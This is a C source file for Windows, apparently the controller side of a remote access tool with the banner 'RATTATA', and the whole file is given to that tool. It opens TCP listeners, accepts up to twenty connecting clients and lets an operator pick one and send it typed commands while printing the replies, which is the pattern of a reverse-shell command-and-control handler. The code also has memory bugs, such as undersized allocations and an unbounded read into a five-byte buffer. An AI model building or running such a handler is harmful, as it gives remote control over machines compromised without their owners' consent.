#define DEFAULT_PORT "8888"

#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 4096
#define MAX_CLIENTS 20

typedef struct ThreadData
{
    SOCKET Listener;
} THREADDATA, *PTHREADDATA;

typedef struct ClientInfo
{
    int id;
    char *ip;
    SOCKET Socket;
} CLIENTINFO, *PCLIENTINFO;

void init_client_thread(PTHREADDATA pclientdata);

char *PORT;
PTHREADDATA pDataArray[MAX_CLIENTS];
DWORD dwThreadIdArray[MAX_CLIENTS];
HANDLE hThreadArray[MAX_CLIENTS];
int threadNbr = 0;
PCLIENTINFO PClients[MAX_CLIENTS];

int read_config()
{
    // char *content = "PORT=8888";
    // char *file_name = "options.cfg";
    // char *readed = malloc(sizeof(char*));

    // FILE *fp;
    // fp = fopen(file_name, "r");

    // if (fp == NULL)
    // {
    //     fp = fopen(file_name, "w");
    //     for (int i = 0; content[i] != '\0'; i++) {
    //         fputc(content[i], fp);
    //     }
    //     fclose(fp);
    //     return 0;
    // }

    // while ((content = fgetc(fp)) != EOF){
    //     readed = realloc(readed, sizeof(char*));
    //     // strcat(readed, (char*)content);
    //     printf("%c", content);
    //     char a[100];
    //     strcat(a, content);
    //     printf("%s", a);
    // }
    // strcat(readed, "\0");
    // content[strlen(content)-1] = '\0';
    // printf("%d", strlen(content));
    //printf("%s", readed);

    return 0;
}

void logprint(char *type, char *message)
{
    if (strcmp(type, "ERROR") == 0)
    {
        printf("[-]%s\n", message);
    }
    else if (strcmp(type, "SUCCESS") == 0)
    {
        printf("[+]%s\n", message);
    }
}

SOCKET init_listener()
{
    WSADATA wsaData;
    SOCKET ListenSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL;
    struct addrinfo hints;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;
    getaddrinfo(NULL, PORT, &hints, &result);
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

    bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    freeaddrinfo(result);
    listen(ListenSocket, SOMAXCONN);

    return ListenSocket;
}

int link_client(CLIENTINFO *Client)
{
    int iResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int id = Client->id;
    for (;;)
    {
        iResult = recv(Client->Socket, recvbuf, recvbuflen, 0);
        if (iResult > 0)
        {
            printf("%s", recvbuf);
            memset(recvbuf, 0, 4096);
            recvbuf[0] = '\0';
            fgets(recvbuf, 4096, stdin);
            if (strcmp(recvbuf, "background") == 10)
            {
                send(Client->Socket, "", 2, 0);
                memset(recvbuf, 0, 4096);
                recvbuf[0] = '\0';
                break;
            }
            send(Client->Socket, recvbuf, strlen(recvbuf), 0);
            memset(recvbuf, 0, 4096);
            recvbuf[0] = '\0';
        }
        else
        {
            printf("Client unreachable : %d\n", WSAGetLastError());
            closesocket(Client->Socket);
            WSACleanup();

            free(PClients[id]);
            PClients[id] = malloc(sizeof(PCLIENTINFO));
            PClients[id]->id = 0;

            return 0;
        }
    }
    return 0;
}

DWORD WINAPI init_client(LPVOID lpParam)
{
    SOCKET ClientSocket = INVALID_SOCKET;
    PTHREADDATA pData;
    pData = (PTHREADDATA)lpParam;
    ClientSocket = accept(pData->Listener, NULL, NULL);
    closesocket(pData->Listener);

    SOCKET listener = init_listener();
    pDataArray[threadNbr] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
    if (pDataArray[threadNbr] == NULL)
    {
        ExitProcess(2);
    }
    pDataArray[threadNbr]->Listener = listener;
    init_client_thread(pDataArray[threadNbr]);

    for (int i = 1; i < MAX_CLIENTS; i++)
    {
        if (PClients[i]->id == 0)
        {
            PClients[i]->id = i;
            // strcpy(PClients[i]->ip, "oui");
            PClients[i]->Socket = ClientSocket;
            printf("\n>>New client connected - %d\n", PClients[i]->id);
            break;
        }
    }
    
    return 0;
}

void init_client_thread(PTHREADDATA pclientdata)
{
    hThreadArray[threadNbr] = CreateThread(NULL, 0, init_client, pclientdata, 0, &dwThreadIdArray[threadNbr]);

    if (hThreadArray[threadNbr] == NULL)
    {
        printf("Error");
        ExitProcess(3);
    }
    threadNbr++;
    
    printf("\n!!!!!!! %d !!!!!!!\n", threadNbr);
}

void menu()
{
    int choice = 0;
    printf("RATTATA >>\n");
    printf("1 - Start a new server.\n2 - View clients\n3 - Exit\nEnter choice : ");
    scanf("%d", &choice);
    if (choice == 1)
    {
        printf("Listening PORT : ");
        scanf("%s", PORT);
        SOCKET listener = init_listener();
        pDataArray[threadNbr] = (PTHREADDATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PTHREADDATA));
        if (pDataArray[threadNbr] == NULL)
        {
            ExitProcess(2);
        }
        pDataArray[threadNbr]->Listener = listener;
        init_client_thread(pDataArray[threadNbr]);
    }
    else if (choice == 2)
    {
        int trigger = 0;
        for (int i = 1; i < MAX_CLIENTS; i++)
        {
            if (PClients[i]->id)
            {
                trigger = 1;
                printf("%d Client\n", PClients[i]->id);
            }
        }
        if (trigger)
        {
            printf("Enter 0 to exit.\n");
            printf("Choose a client : ");
            scanf("%d", &choice);
            if (choice != 0)
            {
                link_client(PClients[choice]);
            }
        }
        else
        {
            printf("No client connected.\n");
        }
    }
    else if (choice == 3)
    {
        ExitProcess(1);
    }
}

int main(void)
{
    //read_config();
    PORT = malloc(5*sizeof(char));
    for (int i = 1; i < MAX_CLIENTS; i++)
    {
        PClients[i] = malloc(sizeof(PCLIENTINFO));
        PClients[i]->id = 0;
    }
    while (1)
    {
        menu();
    }
    return 0;
}